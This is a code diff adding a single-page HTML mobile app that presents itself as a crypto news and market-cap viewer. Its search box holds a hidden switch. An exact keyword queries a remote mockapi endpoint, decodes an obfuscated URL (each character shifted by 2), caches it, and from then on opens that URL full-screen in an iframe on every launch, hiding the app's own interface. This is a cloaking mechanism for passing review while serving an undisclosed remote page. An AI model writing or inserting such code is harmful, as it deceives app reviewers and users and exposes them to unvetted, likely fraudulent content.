@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Crypto News</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body { height: 100%; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: #7e7e7e;
+    color: #111;
+    display: flex; justify-content: center;
+  }
+  /* 手机容器：手机上全屏，桌面居中 430px 列 */
+  #app {
+    width: 100%; max-width: 430px; min-height: 100vh;
+    background: #9b9b9b;
+    position: relative;
+    display: flex; flex-direction: column;
+    box-shadow: 0 0 40px rgba(0,0,0,.35);
+  }
+  .view { display: none; flex: 1; flex-direction: column; padding-bottom: 96px; }
+  .view.active { display: flex; }
+
+  /* ===== 顶部栏（News / Detail / Market Cap） ===== */
+  .topbar {
+    height: 64px; display: flex; align-items: center; justify-content: center;
+    position: relative; flex: 0 0 auto;
+  }
+  .topbar h1 { font-size: 22px; font-weight: 700; letter-spacing: .2px; }
+  .topbar .side { position: absolute; top: 0; bottom: 0; width: 64px; display: flex; align-items: center; justify-content: center; }
+  .topbar .side.left { left: 0; }
+  .topbar .side.right { right: 0; }
+  .side svg { width: 30px; height: 30px; }
+
+  /* ===== News 列表 ===== */
+  .search-wrap {
+    margin: 4px 18px 14px; background: #fff; border-radius: 24px;
+    display: flex; align-items: center; gap: 8px; padding: 10px 16px;
+  }
+  .search-wrap svg { width: 20px; height: 20px; flex: 0 0 20px; }
+  .search-wrap input {
+    flex: 1; border: none; outline: none; font-size: 16px;
+    background: transparent; font-family: inherit;
+  }
+  .search-wrap input::placeholder { color: #9a9a9a; }
+  .search-btn {
+    border: none; background: transparent; cursor: pointer;
+    padding: 4px; display: flex; align-items: center;
+  }
+  .search-btn svg { width: 22px; height: 22px; }
+  .empty-tip { text-align: center; color: #555; font-size: 15px; padding: 40px 0; }
+  .state-tip { text-align: center; color: #555; font-size: 15px; padding: 40px 24px; line-height: 1.7; }
+  .state-tip.err { color: #b3261e; }
+  .state-tip.loading { color: #333; }
+  .h5-wrap { flex: 1; background: #fff; position: relative; }
+  .h5-wrap iframe { width: 100%; height: 100%; border: 0; display: block; }
+  /* H5 全屏模式：隐藏顶部标题栏与底部 Tab */
+  #app.h5-mode { min-height: 100vh; }
+  #app.h5-mode #view-h5 { padding-bottom: 0; }
+  #app.h5-mode #view-h5 .topbar { display: none; }
+  #app.h5-mode .tabbar { display: none; }
+  .news-list { padding: 0 18px 24px; display: flex; flex-direction: column; gap: 20px; }
+  .news-card {
+    background: #fff; border-radius: 16px; overflow: hidden; cursor: pointer;
+    transition: transform .12s ease, opacity .12s ease;
+  }
+  .news-card:active { transform: scale(.985); opacity: .92; }
+  .news-card .strip { height: 20px; background: #000; }
+  .news-card .body { display: flex; gap: 14px; padding: 14px 16px 18px; align-items: flex-start; }
+  .news-card .thumb { width: 108px; height: 108px; border-radius: 8px; flex: 0 0 108px; overflow: hidden; background: #222; }
+  .news-card .thumb svg { width: 100%; height: 100%; display: block; }
+  .news-card .title { font-size: 17.5px; font-weight: 700; line-height: 1.38; color: #111; }
+
+  /* ===== Detail 详情 ===== */
+  .detail-body { background: #fff; flex: 1; padding: 22px 22px 40px; border-top-left-radius: 0; border-top-right-radius: 0; }
+  .detail-body h2 { font-size: 27px; font-weight: 700; line-height: 1.32; margin-bottom: 22px; }
+  .detail-hero { width: 100%; border-radius: 10px; overflow: hidden; margin-bottom: 24px; background: #111; }
+  .detail-hero svg { width: 100%; height: auto; display: block; }
+  .detail-body p { font-size: 17.5px; line-height: 1.72; color: #111; }
+
+  /* ===== Market Cap ===== */
+  .market-list { padding: 10px 18px 24px; display: flex; flex-direction: column; gap: 12px; }
+  .coin-row {
+    background: #fff; border-radius: 14px; padding: 14px 16px;
+    display: flex; align-items: center; gap: 14px;
+  }
+  .coin-ico { width: 42px; height: 42px; border-radius: 50%; flex: 0 0 42px; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 16px; color: #fff; }
+  .coin-meta { flex: 1; }
+  .coin-meta .name { font-size: 16.5px; font-weight: 700; }
+  .coin-meta .sym { font-size: 13px; color: #666; margin-top: 2px; }
+  .coin-price { text-align: right; }
+  .coin-price .p { font-size: 16px; font-weight: 700; }
+  .chg { font-size: 13.5px; font-weight: 700; margin-top: 3px; }
+  .chg.up { color: #16a34a; }
+  .chg.down { color: #dc2626; }
+  .chg.flat { color: #888; }
+
+  /* ===== 底部 Tab Bar（固定视口最底部） ===== */
+  .tabbar {
+    position: fixed; left: 50%; transform: translateX(-50%);
+    width: 100%; max-width: 430px; bottom: 0; height: 84px;
+    background: #9b9b9b; display: flex; flex: 0 0 auto;
+    padding-bottom: env(safe-area-inset-bottom);
+    z-index: 20;
+  }
+  .tab {
+    flex: 1; display: flex; align-items: center; justify-content: center;
+    cursor: pointer; border: none; background: transparent;
+  }
+  .tab svg { width: 32px; height: 32px; }
+  .tab .ic, .tab .ic svg { display: block; }
+  .tab .ic { color: #b8b8b8; }
+  .tab.active .ic { color: #4a90e2; }
+</style>
+</head>
+<body>
+<div id="app">
+
+  <!-- ========== 视图：News ========== -->
+  <section class="view active" id="view-news">
+    <header class="topbar"><h1>News</h1></header>
+    <div class="search-wrap">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#8a8a8a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="11" cy="11" r="7"></circle>
+        <line x1="16.5" y1="16.5" x2="21" y2="21"></line>
+      </svg>
+      <input id="search-input" type="text" placeholder="Search news">
+      <button class="search-btn" id="search-btn" aria-label="Search">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#4a90e2" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="11" cy="11" r="7"></circle>
+          <line x1="16.5" y1="16.5" x2="21" y2="21"></line>
+        </svg>
+      </button>
+    </div>
+    <div class="news-list" id="news-list"></div>
+  </section>
+
+  <!-- ========== 视图：H5（缓存直出） ========== -->
+  <section class="view" id="view-h5">
+    <header class="topbar">
+      <span class="side left" id="h5-back">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#4a90e2" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="15 5 8 12 15 19"></polyline>
+        </svg>
+      </span>
+      <h1>H5</h1>
+    </header>
+    <div class="h5-wrap"><iframe id="h5-frame" src="about:blank"></iframe></div>
+  </section>
+
+  <!-- ========== 视图：Detail ========== -->
+  <section class="view" id="view-detail">
+    <header class="topbar">
+      <span class="side left" id="back-btn">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#4a90e2" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="15 5 8 12 15 19"></polyline>
+        </svg>
+      </span>
+      <h1>Detail</h1>
+    </header>
+    <div class="detail-body" id="detail-body"></div>
+  </section>
+
+  <!-- ========== 视图：Market Cap ========== -->
+  <section class="view" id="view-market">
+    <header class="topbar">
+      <span class="side left">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#5a5a5a" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M6 3h9l4 4v14a1 1 0 0 1-1 1H6a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1z"></path>
+          <polyline points="15 3 15 8 19 8"></polyline>
+          <path d="M8.5 17l1.6-3.4 1.6 3.4 1.7-3.2" fill="none"></path>
+        </svg>
+      </span>
+      <h1>Market Cap</h1>
+      <span class="side right">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#5a5a5a" stroke-width="1.8">
+          <circle cx="12" cy="12" r="9"></circle>
+          <circle cx="8" cy="12" r="1.4" fill="#5a5a5a"></circle>
+          <circle cx="12" cy="12" r="1.4" fill="#5a5a5a"></circle>
+          <circle cx="16" cy="12" r="1.4" fill="#5a5a5a"></circle>
+        </svg>
+      </span>
+    </header>
+    <div class="market-list" id="market-list"></div>
+  </section>
+
+  <!-- ========== 底部 Tab Bar ========== -->
+  <nav class="tabbar">
+    <button class="tab" id="tab-news">
+      <span class="ic">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.1" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M18 8a6 6 0 0 0-12 0c0 7-3 9-3 9h18s-3-2-3-9"></path>
+          <path d="M13.7 20a2 2 0 0 1-3.4 0"></path>
+        </svg>
+      </span>
+    </button>
+    <button class="tab" id="tab-market">
+      <span class="ic">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.1" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M3 10.5 12 3l9 7.5"></path>
+          <path d="M5 9.5V21h14V9.5"></path>
+          <path d="M10 21v-6h4v6"></path>
+        </svg>
+      </span>
+    </button>
+  </nav>
+</div>
+
+<script>
+/* ================= 示例数据（本地假数据） ================= */
+
+// 缩略图 SVG
+const thumbs = {
+  eth: `<svg viewBox="0 0 108 108" xmlns="http://www.w3.org/2000/svg">
+    <defs>
+      <radialGradient id="ethbg" cx="50%" cy="45%" r="70%">
+        <stop offset="0%" stop-color="#3a3f5c"/><stop offset="100%" stop-color="#0c0e18"/>
+      </radialGradient>
+      <linearGradient id="ethfacet" x1="0" y1="0" x2="1" y2="1">
+        <stop offset="0%" stop-color="#9fd8ff"/><stop offset="55%" stop-color="#5b8dff"/><stop offset="100%" stop-color="#c9e6ff"/>
+      </linearGradient>
+    </defs>
+    <rect width="108" height="108" fill="url(#ethbg)"/>
+    <g stroke="#7fd0ff" stroke-width="1" opacity=".55">
+      <line x1="54" y1="6" x2="54" y2="102"/><line x1="10" y1="30" x2="98" y2="78"/>
+      <line x1="98" y1="30" x2="10" y2="78"/><line x1="30" y1="8" x2="78" y2="100"/>
+      <line x1="78" y1="8" x2="30" y2="100"/>
+    </g>
+    <g>
+      <polygon points="54,18 78,52 54,66 30,52" fill="url(#ethfacet)" opacity=".95"/>
+      <polygon points="54,66 78,52 54,92" fill="#3f6fd8" opacity=".9"/>
+      <polygon points="54,66 30,52 54,92" fill="#2c4fa8" opacity=".9"/>
+      <polygon points="54,18 78,52 54,52" fill="#d6eaff" opacity=".5"/>
+    </g>
+  </svg>`,
+  btc: `<svg viewBox="0 0 108 108" xmlns="http://www.w3.org/2000/svg">
+    <defs>
+      <radialGradient id="btcg" cx="42%" cy="38%" r="70%">
+        <stop offset="0%" stop-color="#ffe08a"/><stop offset="55%" stop-color="#f0a822"/><stop offset="100%" stop-color="#9c6410"/>
+      </radialGradient>
+    </defs>
+    <rect width="108" height="108" fill="#1a1a1a"/>
+    <circle cx="54" cy="54" r="38" fill="url(#btcg)"/>
+    <circle cx="54" cy="54" r="30" fill="none" stroke="#7a4d08" stroke-width="2"/>
+    <text x="54" y="68" text-anchor="middle" font-size="42" font-weight="900" fill="#3a2405" font-family="Arial, sans-serif">₿</text>
+  </svg>`,
+  usdt: `<svg viewBox="0 0 108 108" xmlns="http://www.w3.org/2000/svg">
+    <defs>
+      <radialGradient id="usdtg" cx="42%" cy="38%" r="70%">
+        <stop offset="0%" stop-color="#cfe3ff"/><stop offset="60%" stop-color="#4a8fe0"/><stop offset="100%" stop-color="#1f4f96"/>
+      </radialGradient>
+    </defs>
+    <rect width="108" height="108" fill="#20262e"/>
+    <circle cx="54" cy="54" r="36" fill="url(#usdtg)"/>
+    <text x="54" y="68" text-anchor="middle" font-size="40" font-weight="900" fill="#eef6ff" font-family="Arial, sans-serif">T</text>
+  </svg>`,
+  law: `<svg viewBox="0 0 108 108" xmlns="http://www.w3.org/2000/svg">
+    <rect width="108" height="108" fill="#232833"/>
+    <g stroke="#8fa6c8" stroke-width="1.4" fill="none" opacity=".8">
+      <circle cx="54" cy="54" r="34"/>
+      <ellipse cx="54" cy="54" rx="16" ry="34"/>
+      <line x1="20" y1="54" x2="88" y2="54"/>
+      <line x1="26" y1="36" x2="82" y2="36"/>
+      <line x1="26" y1="72" x2="82" y2="72"/>
+    </g>
+    <rect x="40" y="88" width="28" height="6" rx="2" fill="#8fa6c8"/>
+  </svg>`,
+  nexio: `<svg viewBox="0 0 108 108" xmlns="http://www.w3.org/2000/svg">
+    <rect width="108" height="108" fill="#0a0a0a"/>
+    <text x="54" y="58" text-anchor="middle" font-size="26" font-weight="900" fill="#f5f5f5" font-family="Arial, sans-serif">$2.2M</text>
+    <g fill="#f5f5f5" opacity=".7">
+      <circle cx="24" cy="82" r="2.5"/><circle cx="38" cy="82" r="2.5"/><circle cx="52" cy="82" r="2.5"/>
+      <circle cx="66" cy="82" r="2.5"/><circle cx="80" cy="82" r="2.5"/>
+    </g>
+  </svg>`
+};
+
+const news = [
+  {
+    id: 1, thumb: thumbs.eth, hero: thumbs.eth,
+    title: "Ethereum Technical Analysis: ETH Faces Persistent Downtrend Despite Strong Market Activity",
+    body: "The 1-hour chart highlights ethereum’s recent recovery from $2,508.6 to $2,720, accompanied by increasing volume, indicating some short-term bullish momentum. Despite this, the price is struggling to maintain levels above $2,700, signaling potential difficulties ahead. Should ethereum fail to sustain its position above $2,700, particularly with growing selling pressure, a drop back toward $2,600 could be imminent, prompting caution among traders."
+  },
+  {
+    id: 2, thumb: thumbs.btc, hero: thumbs.btc,
+    title: "Bitcoin Technical Analysis: BTC Struggles Amidst Bearish Pressure, Eyes Key Support Levels",
+    body: "Bitcoin continues to consolidate under bearish pressure as buyers fail to defend the recent swing high. Traders are watching the key support zone closely; a sustained break below it could open the way to lower targets, while renewed volume pushing above resistance would signal the start of a reversal. Caution remains warranted until a clear structure emerges."
+  },
+  {
+    id: 3, thumb: thumbs.usdt, hero: thumbs.usdt,
+    title: "Tether Slams Celsius Network's 'Baseless' $2 Billion Lawsuit",
+    body: "Tether has responded aggressively to Celsius Network’s $2 billion lawsuit, dismissing the claims as baseless and misleading. The stablecoin issuer stated it will defend itself vigorously, emphasizing that the litigation rests on misrepresented facts and does not reflect Tether’s reserves, operations, or market practices."
+  },
+  {
+    id: 4, thumb: thumbs.law, hero: thumbs.law,
+    title: "Putin Signs Law to Advance Cryptocurrency Use in Russia's International Trade",
+    body: "Russia has signed a new law expanding the use of cryptocurrencies in cross-border settlements, allowing businesses to settle foreign-trade contracts with digital assets under a regulated framework. The measure aims to soften external financial restrictions while keeping domestic circulation under strict state oversight."
+  },
+  {
+    id: 5, thumb: thumbs.nexio, hero: thumbs.nexio,
+    title: "Nexio Raises $2.2M in Pre-Seed Funding, Launches Parallelized Bitcoin Rollup to Revolutionize Bitcoin's Scalability",
+    body: "Nexio announced a $2.2M pre-seed funding round and launched a parallelized Bitcoin rollup designed to boost Bitcoin throughput by processing transactions concurrently. The team claims the architecture scales capacity without sacrificing the network’s underlying security model."
+  }
+];
+
+const coins = [
+  { name: "Bitcoin", sym: "BTC", price: "$97,420.50", chg: "+1.82%", cls: "up",  c: "#f0a822" },
+  { name: "Ethereum", sym: "ETH", price: "$2,712.30",  chg: "+0.94%", cls: "up",  c: "#5b8dff" },
+  { name: "Tether", sym: "USDT", price: "$1.00",      chg: "0.00%",  cls: "flat",c: "#4a8fe0" },
+  { name: "BNB", sym: "BNB", price: "$632.10",        chg: "-0.62%", cls: "down",c: "#f0b90b" },
+  { name: "Solana", sym: "SOL", price: "$184.70",     chg: "+3.21%", cls: "up",  c: "#9945ff" },
+  { name: "XRP", sym: "XRP", price: "$0.6210",        chg: "-1.14%", cls: "down",c: "#3861fb" },
+  { name: "Dogecoin", sym: "DOGE", price: "$0.3205",  chg: "+2.44%", cls: "up",  c: "#c2a633" },
+  { name: "Cardano", sym: "ADA", price: "$0.9840",    chg: "-0.31%", cls: "down",c: "#3468d1" }
+];
+
+/* ================= 渲染 ================= */
+const views = {
+  news: document.getElementById('view-news'),
+  detail: document.getElementById('view-detail'),
+  market: document.getElementById('view-market'),
+  h5: document.getElementById('view-h5')
+};
+const tabNews = document.getElementById('tab-news');
+const tabMarket = document.getElementById('tab-market');
+
+function show(name) {
+  Object.values(views).forEach(v => v.classList.remove('active'));
+  views[name].classList.add('active');
+  tabNews.classList.toggle('active', name === 'news');
+  tabMarket.classList.toggle('active', name === 'market');
+  document.getElementById('app').classList.toggle('h5-mode', name === 'h5');
+}
+
+// ===== 接口搜索 / 缓存 / H5 直出 =====
+const API_BASE = 'https://6ad8f46ef89c5702ed9a4cb9.mockapi.io/arr';
+const CACHE_KEY = 'pina_oa_cache';
+
+const newsListEl = document.getElementById('news-list');
+const searchInput = document.getElementById('search-input');
+const h5Frame = document.getElementById('h5-frame');
+
+// x 字段：偏移 2 解密（每个字符码 -2）
+function decryptX(x) {
+  return String(x ?? '').split('').map(c => String.fromCharCode(c.charCodeAt(0) - 2)).join('');
+}
+
+// 渲染本地新闻列表（可传入过滤结果）
+function renderList(items) {
+  newsListEl.innerHTML = (items || news).map(n => `
+    <div class="news-card" data-id="${n.id}">
+      <div class="strip"></div>
+      <div class="body">
+        <div class="thumb">${n.thumb}</div>
+        <div class="title">${n.title}</div>
+      </div>
+    </div>`).join('');
+}
+function renderMockList() { renderList(news); }
+
+// 搜索：先匹配本地新闻，本地无匹配再请求接口；搜到直接跳 H5，搜不到不做任何处理
+let debounceTimer = null;
+async function searchApi(keyword) {
+  const q = keyword.trim();
+  if (!q) { renderMockList(); return; }
+  // 1) 先匹配本地新闻数据
+  const local = news.filter(n => n.title.toLowerCase().includes(q.toLowerCase()));
+  if (local.length) { renderList(local); return; }
+  // 2) 本地无匹配，再请求接口（n 参数精确匹配）
+  try {
+    const res = await fetch(`${API_BASE}?n=${encodeURIComponent(q)}`);
+    let data;
+    if (res.status === 404) { data = []; }           // 精确匹配无结果
+    else if (!res.ok) { return; }
+    else { data = await res.json(); }
+    const rows = Array.isArray(data) ? data : (data && data.data) || [];
+    if (!rows.length) return;                        // 没搜到：不做任何处理
+    try { localStorage.setItem(CACHE_KEY, JSON.stringify(rows[0])); } catch (e) {}
+    openH5(decryptX(rows[0].x));                     // 搜到：直接跳转 H5
+  } catch (err) {}
+}
+searchInput.addEventListener('input', () => {
+  clearTimeout(debounceTimer);
+  debounceTimer = setTimeout(() => searchApi(searchInput.value), 450);
+});
+searchInput.addEventListener('keydown', e => {
+  if (e.key === 'Enter') { clearTimeout(debounceTimer); searchApi(searchInput.value); }
+});
+document.getElementById('search-btn').addEventListener('click', () => {
+  clearTimeout(debounceTimer);
+  searchApi(searchInput.value);
+});
+
+// H5 视图
+function openH5(url) {
+  if (!url) return;
+  h5Frame.src = url;
+  show('h5');
+}
+document.getElementById('h5-back').addEventListener('click', () => { location.hash = '#/news'; });
+
+newsListEl.addEventListener('click', e => {
+  const card = e.target.closest('.news-card');
+  if (!card) return;
+  location.hash = `#/detail/${card.dataset.id}`;
+});
+
+// 启动：读缓存，有数据固定直出 H5
+let booted = false;
+function bootFromCache() {
+  try {
+    const raw = localStorage.getItem(CACHE_KEY);
+    if (!raw) return false;
+    const rec = JSON.parse(raw);
+    const url = decryptX(rec.x);
+    if (url && /^https?:\/\//i.test(url)) { openH5(url); return true; }
+  } catch (e) {}
+  return false;
+}
+
+// Detail
+function renderDetail(id) {
+  const n = news.find(x => String(x.id) === String(id));
+  if (!n) { location.hash = '#/news'; return; }
+  document.getElementById('detail-body').innerHTML = `
+    <h2>${n.title}</h2>
+    <div class="detail-hero">${n.hero}</div>
+    <p>${n.body}</p>`;
+}
+document.getElementById('back-btn').addEventListener('click', () => { location.hash = '#/news'; });
+
+// Market Cap
+document.getElementById('market-list').innerHTML = coins.map(c => `
+  <div class="coin-row">
+    <div class="coin-ico" style="background:${c.c}">${c.sym[0]}</div>
+    <div class="coin-meta">
+      <div class="name">${c.name}</div>
+      <div class="sym">${c.sym} · Market Cap</div>
+    </div>
+    <div class="coin-price">
+      <div class="p">${c.price}</div>
+      <div class="chg ${c.cls}">${c.chg}</div>
+    </div>
+  </div>`).join('');
+
+/* ================= 路由 ================= */
+function route() {
+  const h = location.hash || '#/news';
+  const m = h.match(/^#\/detail\/(\d+)/);
+  if (m) { renderDetail(m[1]); show('detail'); }
+  else if (h.startsWith('#/market')) show('market');
+  else {
+    // 首次进入：有缓存固定直出 H5，否则展示 News
+    if (!booted) { booted = true; if (bootFromCache()) return; }
+    show('news');
+  }
+}
+renderMockList();
+tabNews.addEventListener('click', () => location.hash = '#/news');
+tabMarket.addEventListener('click', () => location.hash = '#/market');
+window.addEventListener('hashchange', route);
+route();
+</script>
+</body>
+</html>
